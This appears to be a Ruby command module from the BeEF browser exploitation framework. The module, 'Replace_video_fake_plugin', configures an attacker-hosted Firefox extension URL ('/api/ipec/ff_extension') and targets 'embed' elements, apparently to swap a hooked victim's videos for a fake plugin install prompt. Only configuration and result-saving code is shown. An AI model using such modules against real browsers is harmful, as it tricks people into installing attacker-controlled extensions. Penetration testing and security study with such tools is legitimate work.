#
# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Replace_video_fake_plugin < BeEF::Core::Command

  def self.options
    configuration = BeEF::Core::Configuration.instance
    proto = configuration.get("beef.http.https.enable") == true ? "https" : "http"
    beef_host = configuration.get("beef.http.public")      || configuration.get("beef.http.host")
    beef_port = configuration.get("beef.http.public_port") || configuration.get("beef.http.port")
    url = "#{proto}://#{beef_host}:#{beef_port}"
    return [
        {'name' => 'url', 'ui_label' => 'Plugin URL', 'value' => url+'/api/ipec/ff_extension', 'width'=>'150px'},
        {'name' => 'jquery_selector', 'ui_label' => 'jQuery Selector', 'value' => 'embed', 'width'=>'150px'}
    ]
  end

  def post_execute
    content = {}
    content['Result'] = @datastore['result']
    save content
  end

end
